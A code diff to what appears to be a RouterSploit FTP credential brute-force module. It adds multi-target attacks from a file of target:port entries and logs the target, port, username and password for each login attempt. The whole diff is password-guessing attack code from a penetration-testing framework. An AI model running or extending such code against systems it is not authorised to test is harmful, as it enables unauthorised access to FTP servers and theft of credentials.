@@ -11,6 +11,7 @@ from routersploit import (
     print_success,
     print_table,
     boolify,
+    multi,
 )
 
 
@@ -26,7 +27,7 @@ class Exploit(exploits.Exploit):
         ]
     }
 
-    target = exploits.Option('', 'Target IP address')
+    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
     port = exploits.Option(21, 'Target port')
 
     threads = exploits.Option(8, 'Numbers of threads')
@@ -37,6 +38,10 @@ class Exploit(exploits.Exploit):
 
     def run(self):
         self.credentials = []
+        self.attack()
+
+    @multi
+    def attack(self):
         ftp = ftplib.FTP()
         try:
             ftp.connect(self.target, port=int(self.port), timeout=10)
@@ -58,7 +63,7 @@ class Exploit(exploits.Exploit):
 
         if len(self.credentials):
             print_success("Credentials found!")
-            headers = ("Login", "Password")
+            headers = ("Target", "Port", "Login", "Password")
             print_table(headers, *self.credentials)
         else:
             print_error("Credentials not found")
@@ -95,10 +100,10 @@ class Exploit(exploits.Exploit):
                     ftp.login(user, password)
 
                     running.clear()
-                    print_success("{}: Authentication succeed!".format(name), user, password, verbose=module_verbosity)
-                    self.credentials.append((user, password))
+                    print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
+                    self.credentials.append((self.target, self.port, user, password))
                 except:
-                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password), verbose=module_verbosity)
+                    print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
 
                 ftp.close()
 
